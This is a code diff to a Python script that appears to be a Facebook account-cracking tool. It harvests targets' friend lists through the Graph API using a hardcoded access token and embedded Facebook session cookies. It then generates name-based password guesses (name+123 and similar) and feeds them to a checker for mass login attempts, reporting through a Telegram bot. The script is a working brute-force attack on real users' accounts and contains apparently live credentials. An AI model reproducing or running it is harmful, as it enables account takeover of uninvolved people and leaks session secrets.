@@ -9,7 +9,7 @@ from concurrent.futures import ThreadPoolExecutor as kil
 
 Id,token = input('\033[2;36m- Enter ID Telegram ~ ادخل ايديك تلجرام : \033[1;97m'),input('\033[2;36m- Enter Token BOT Telegram ~ ادخل توكن البوت : \033[1;97m')
 kopo = requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(Id) + '&text=' + str('- Tool Run • تم تشغيل الاداة '))
-webbrowser.open('')
+webbrowser.open('https://t.me/Pythonln')
 if kopo.status_code == 404:
 	exit('\x1b[91;1m\n - Kilwa • ☒ التوكن او الايدي غلط ☒ ')	
 bot = telebot.TeleBot(token,parse_mode='HTML')
@@ -37,7 +37,7 @@ z,total,ok,cp=0,0,0,0
 
 def get(user):
 	try:
-		url = requests.get('https://graph.facebook.com/{}'.format(user),params={'access_token': 'EAABwzLixnjYBO8aDgnZCXTXnwv91swARorjXxPtRfKOrqGejLbbgd6SXDN5RzrysOqQavJjCIrvPZB0FFCMJdZCJHUec6ZA8e7qQhLFodPKlJr9CXwb8MHZCzISXi4od26Ky1HNk6P1CpOBX6vgNY16JZB7CpfcEdoYDRTgmdZCWWWvhLdy53eCoZBuBtQBhUbQw3jgZD','fields': "friends"},headers={"user-agent": user_agent.generate_user_agent()},cookies={'cookies':'datr=VqnyZnssqsKBKbgESlZ_taLG; sb=VqnyZpfwktei3fZkOk0sEFeH; m_pixel_ratio=2.75; wd=377x640; c_user=100090482843712; fr=0b0KoK4pThQiTR8mL.AWWeigM0vY7FfxFoRHb45ibCfwA.Bm8qlW..AAA.0.0.Bm8qmY.AWWN7S50aL8; xs=7%3Ah05w7mywPWPRuw%3A2%3A1727179162%3A-1%3A14619; locale=ar_AR; fbl_st=101223390%3BT%3A28786319; vpd=v1%3B640x377x2.75'}).json()
+		url = requests.get('https://graph.facebook.com/{}'.format(user),params={'access_token': 'EAABwzLixnjYBO8aDgnZCXTXnwv91swARorjXxPtRfKOrqGejLbbgd6SXDN5RzrysOqQavJjCIrvPZB0FFCMJdZCJHUec6ZA8e7qQhLFodPKlJr9CXwb8MHZCzISXi4od26Ky1HNk6P1CpOBX6vgNY16JZB7CpfcEdoYDRTgmdZCWWWvhLdy53eCoZBuBtQBhUbQw3jgZD','fields': "friends"},headers={"user-agent": user_agent.generate_user_agent()},cookies={'cookies':'datr=a6P2ZtZgqa3evWX1abyarGLu;sb=a6P2ZtwVb84onNsO05s6K5zI;m_pixel_ratio=2.3638083934783936;wd=457x893;c_user=100037481652531;fr=01qZpS9srdwZqmibz.AWUyGeW44HBup0OC6ZG6_BTveqk.Bm9qNr..AAA.0.0.Bm9qRa.AWUYaxEO74k;xs=34%3AW4M6l5kOzN6teQ%3A2%3A1727439964%3A-1%3A6564;locale=ar_AR;wl_cbv=v2%3Bclient_version%3A2632%3Btimestamp%3A1727439971;fbl_st=101220666%3BT%3A28790666;vpd=v1%3B768x393x2.3638083934783936'}).json()
 		for mm in url['friends']['data']:
 			ko = (mm['id']+'|'+mm['name'])
 			if ko in fid:
@@ -76,7 +76,7 @@ def password():
 		for kk in fid:
 			idf,nmf = kk.split('|')[0],kk.split('|')[1].lower()
 			frs = nmf.split(' ')[0]
-			pwv = [nmf,frs+frs,frs+' '+frs,frs+'123',frs+'12345',frs+'123456',frs+'1234',frs+'123456789',frs+'1234567890',frs+'1122334455']
+			pwv = [nmf,frs+frs,frs+' '+frs,frs+'123',frs+'12345',frs+'123456',frs+'123456789',frs+'1234567890',frs+'112233',frs+'123123']
 			kp.submit(checker,idf,pwv)
 
 def checker(idf,pwv):
